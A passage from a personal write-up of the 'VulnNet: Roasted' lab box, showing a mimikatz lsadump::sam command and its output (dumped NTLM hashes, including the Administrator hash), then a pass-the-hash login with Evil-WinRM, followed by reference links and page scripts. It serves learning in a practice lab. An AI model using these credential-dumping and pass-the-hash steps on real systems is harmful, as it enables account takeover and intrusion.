WIN-2BO8M1OE1M1.vulnnet-rst.local / S-1-5-21-1589833671-435344116-4136949213<br><br>  .#####.   mimikatz 2.2.0 (x64) #19041 Jan 29 2023 07:49:10<br> .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)<br> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )<br> ## \ / ##       > https://blog.gentilkiwi.com/mimikatz<br> '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )<br>  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/<br><br>mimikatz(powershell) # lsadump::sam /system:C:\Users\a-whitehat\Desktop\system.save /SAM:C:\Users\a-whitehat\Desktop\sam.save<br>Domain : WIN-2BO8M1OE1M1<br>SysKey : f10a2788aef5f622149a41b2c745f49a<br>Local SID : S-1-5-21-3922353661-2074872711-32542901<br><br>SAMKey : 790ed1753a942488d45b96159e2cd967<br><br>RID  : 000001f4 (500)<br>User : Administrator<br>  Hash NTLM: c2597747aa5e43022a3a3049a3c3b09d<br><br>RID  : 000001f5 (501)<br>User : Guest<br><br>RID  : 000001f7 (503)<br>User : DefaultAccount<br><br>RID  : 000001f8 (504)<br>User : WDAGUtilityAccount</pre></p></div><div><p>Carefully note how the command line arguments are separated by a single space and the three commands are enclosed in double quotes, and again, the whole string is enclosed in single quotes. It took me several hours to understand the right way to provide the command line argument to Mimikatz.</p></div><div><p><img src="/cyber/writeup/vulnet-roasted/mimikatz-commnad-line-argument.jpg" alt=""></p></div></div></div><div id="Accessing-as-Administrato"><div><h1> <span style="color:#da1953">Acc</span>essing as Administrator</h1></div><div><p>After an hour trying to crack the administrator password, I relied on the writeup again and found out that with Evil-WinRm, I can access with the hash and do not necessarily need to crack the hash to get the password in clear text.</p></div><div><p><img src="/cyber/writeup/vulnet-roasted/admin-access.JPG" alt=""></p></div></div><div id="Helpfull-links"><div><h1><span style="color:#da1953">Hel</span>pful links</h1></div><div>[1] https://redcanary.com/threat-detection-report/threats/mimikatz/</div><div>[2] https://happycamper84.medium.com/mimikatz-cheatsheet-ad2b88059b4</div><div>[3] https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/</div><div>[4] https://www.nitttrchd.ac.in/imee/Labmanuals/Password%20Cracking%20of%20Windows%20Operating%20System.pdf</div><div>[5] https://www.netexec.wiki/smb-protocol/enumeration/smb-signing-not-required</div></div></div> </div></div></div><div class="sidebarRight"><div class="sidebarRightChild"><h2>Index</h2><div></div><br/><h2>Tags</h2><div class="tags"><a style="margin-top:10px" href="/cyber/tags?searchTag=active+directory"><my-tag>active directory</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=box"><my-tag>box</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=dc"><my-tag>dc</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=easy"><my-tag>easy</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=ejpt"><my-tag>ejpt</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=evil-winrm"><my-tag>evil-winrm</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=hashcat"><my-tag>hashcat</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=kerberoasting"><my-tag>kerberoasting</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=kerberos+attack"><my-tag>kerberos attack</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=oscp"><my-tag>oscp</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=privesc"><my-tag>privesc</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=smb"><my-tag>smb</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=smbclient"><my-tag>smbclient</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=thm"><my-tag>thm</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=windows"><my-tag>windows</my-tag></a></div></div></div></div><script src="/_next/static/chunks/webpack-97a4f47456697fca.js" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"1:\"$Sreact.fragment\"\n2:I[5244,[],\"\"]\n3:I[3866,[],\"\"]\n4:I[3108,[\"7667\",\"static/chunks/4bd22374-385178446340ab50.js\",\"8173\",\"static/chunks/8173-a0231b583aa8a812.js\",\"8541\",\"static/chunks/8541-83b6253cc9a1a19d.js\",\"5699\",\"static/chunks/5699-d5e6aa1c7bb352a9.js\",\"8893\",\"static/chunks/app/cyber/writeup/vulnet-roasted/page-3cd23d5d87384809.js\"],\"default\"]\n5:I[5897,[\"7667\",\"static/chunks/4bd22374-385178446340ab50.js\",\"8173\",\"static/chunks/8173-a0231b583aa8a812.js\",\"8541\",\"static/chunks/8541-83b6253cc9a1a19d.js\",\"5699\",\"static/chunks/5699-d5e6aa1c7bb352a9.js\",\"8893\",\"static/chunks/app/cyber/writeup/vulnet-roasted/page-3cd23d5d87384809.js\"],\"default\"]\n6:I[8845,[\"7667\",\"static/chunks/4bd22374-385178446340ab50.js\",\"8173\",\"static/chunks/8173-a0231b583aa8a812.js\",\"8541\",\"static/chunks/8541-83b6253cc9a1a19d.js\",\"5699\",\"static/chunks/5699-d5e6aa1c7bb352a9.js\",\"8893\",\"static/chunks/app/cyber/writeup/vulnet-roasted/page-3cd23d5d87384809.js\"],\"default\"]\n7:I[6213,[],\"OutletBoundary\"]\n9:I[6213,[],\"MetadataBoundary\"]\nb:I[6213,[],\"ViewportBoundary\"]\nd:I[4835,[],\"\"]\n:HL[\"/_next/static/css/f194b09a73f2e100.css\",\"style\"]\n"])</script><script>self.__next_f.push([1,"0:{\"P\":null,\"b\":\"lRTtoW0zv952YuV5sIyD4\",\"p\":\"\",\"c\":[\"\",\"cyber\",\"writeup\",\"vulnet-roasted\"],\"i\":false,\"f\":[[[\"\",{\"children\":[\"cyber\",{\"children\":[\"writeup\",{\"children\":[\"vulnet-roasted\",{\"children\":[\"__PAGE__\",{}]}]}]}]},\"$undefined\",\"$undefined\",true],[\"\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"html\",null,{\"lang\":\"en\",\"children\":[\"$\",\"body\",null,{\"children\":[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[],[\"$\",\"div\",null,{\"children\":[\"$\",\"center\",null,{\"children\":[\"Page not found\",[\"$\",\"br\",null,{}],\"You have followed and old link that does not work anymore\",[\"$\",\"br\",null,{}],\"The site has migrated from React app to NextJS app\"]}]}]],\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}]}]]}],{\"children\":[\"cyber\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"cyber\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[\"writeup\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"cyber\",\"children\",\"writeup\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[\"vulnet-roasted\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"cyber\",\"children\",\"writeup\",\"children\",\"vulnet-roasted\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[\"__PAGE__\",[\"$\",\"$1\",\"c\",{\"children\":[[\"$\",\"div\",null,{\"className\":\"Wrapper\",\"children\":[[\"$\",\"$L4\",null,{}],[\"$\",\"div\",null,{\"className\":\"content\",\"children\":[\"$\",\"div\",null,{\"className\":\"Post\",\"children\":[\"$\",\"$L5\",null,{\"postname\":\"writeupdb/vulnet-roasted.json\"}]}]}],[\"$\",\"$L6\",null,{\"postname\":\"writeupdb/vulnet-roasted.json\"}]]}],[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/f194b09a73f2e100.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"$L7\",null,{\"children\":\"$L8\"}]]}],{},null,false]},null,false]},null,false]},null,false]},null,false],[\"$\",\"$1\",\"h\",{\"children\":[null,[\"$\",\"$1\",\"pgi9yVl_Vtzid8sKUytEH\",{\"children\":[[\"$\",\"$L9\",null,{\"children\":\"$La\"}],[\"$\",\"$Lb\",null,{\"children\":\"$Lc\"}],null]}]]}],false]],\"m\":\"$undefined\",\"G\":[\"$d\",\"$undefined\"],\"s\":false,\"S\":true}\n"])</script><script>self.__next_f.push([1,"c:[[\"$\",\"meta\",\"0\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\na:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"link\",\"1\",{\"rel\":\"icon\",\"href\":\"/avatar.jpg\"}]]\n"])</script><script>self.__next_f.push([1,"8:null\n"])</script></body></html>